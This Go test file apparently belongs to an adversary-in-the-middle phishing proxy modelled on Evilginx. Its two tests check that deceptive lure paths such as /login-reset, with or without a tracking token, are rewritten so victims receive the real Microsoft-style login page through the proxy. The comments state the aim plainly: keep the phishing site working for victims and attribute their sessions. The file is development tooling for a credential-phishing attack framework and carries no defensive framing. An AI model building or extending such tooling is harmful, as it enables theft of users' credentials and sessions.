package proxy

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/pkg/lures"
)

// TestLureRewritesDeceptivePathToRealLanding proves the core AiTM routing fix:
// a victim arriving on a phishing path (e.g. /login-reset?id=...) must be served
// the REAL upstream landing path (target.redirect_url), otherwise the origin
// 404s and the victim sees a blank page.
func TestLureRewritesDeceptivePathToRealLanding(t *testing.T) {
	var gotPath string
	var gotQuery string
	done := make(chan struct{})

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotPath = r.URL.Path
		gotQuery = r.URL.RawQuery
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte("<html><body>REAL LOGIN PAGE</body></html>"))
		close(done)
	}))
	defer upstream.Close()

	u, err := url.Parse(upstream.URL)
	if err != nil {
		t.Fatalf("parse upstream: %v", err)
	}

	eng := NewEngine()
	reg := lures.NewRegistry()
	eng.SetLures(reg)

	tp := &storage.TargetProfile{
		ID:          "ms-live",
		Name:        "Microsoft",
		ProxyHost:   "ms.test",
		Origin:      u.Host, // 127.0.0.1:port -> http upstream in dev
		RedirectURL: "/",
		LoginURLs:   []string{"/"},
		Enabled:     true,
	}
	eng.UpsertTarget(tp)

	l, err := reg.Create("login-reset", "ms.test", "")
	if err != nil {
		t.Fatalf("create lure: %v", err)
	}

	h, err := eng.HandlerFor("ms.test")
	if err != nil {
		t.Fatalf("HandlerFor: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "http://ms.test/login-reset?id="+l.ID, nil)
	req.Host = "ms.test"
	rec := httptest.NewRecorder()

	h.ServeHTTP(rec, req)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("upstream never reached")
	}

	if gotPath != "/" {
		t.Errorf("upstream received path %q, want %q (deceptive path leaked to origin)", gotPath, "/")
	}
	if gotQuery != "" {
		t.Errorf("upstream received query %q, want empty (lure token must be stripped)", gotQuery)
	}
	if !strings.Contains(rec.Body.String(), "REAL LOGIN PAGE") {
		t.Errorf("response body missing upstream content: %q", rec.Body.String())
	}
	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want 200", rec.Code)
	}
}

// TestLurePathRewritesWithoutToken proves Evilginx-parity: the deceptive path
// serves the REAL origin page even with NO valid lure token. The token only
// attributes the session; it must not gate page delivery (otherwise the phishing
// site is "dead on arrival" for any normal visitor).
func TestLurePathRewritesWithoutToken(t *testing.T) {
	var gotPath string
	done := make(chan struct{})

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotPath = r.URL.Path
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte("<html><body>REAL LOGIN PAGE</body></html>"))
		close(done)
	}))
	defer upstream.Close()

	u, _ := url.Parse(upstream.URL)

	eng := NewEngine()
	reg := lures.NewRegistry()
	eng.SetLures(reg)

	tp := &storage.TargetProfile{
		ID:          "ms-live",
		ProxyHost:   "ms.test",
		Origin:      u.Host,
		RedirectURL: "/",
		LoginURLs:   []string{"/"},
		Enabled:     true,
	}
	eng.UpsertTarget(tp)

	if _, err := reg.Create("login-reset", "ms.test", ""); err != nil {
		t.Fatalf("create lure: %v", err)
	}

	h, err := eng.HandlerFor("ms.test")
	if err != nil {
		t.Fatalf("HandlerFor: %v", err)
	}

	// No ?id= token at all — must still serve the real landing page.
	req := httptest.NewRequest(http.MethodGet, "http://ms.test/login-reset", nil)
	req.Host = "ms.test"
	rec := httptest.NewRecorder()

	h.ServeHTTP(rec, req)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("upstream never reached")
	}

	if gotPath != "/" {
		t.Errorf("upstream received path %q, want %q (deceptive path must rewrite without a token)", gotPath, "/")
	}
	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want 200", rec.Code)
	}
}
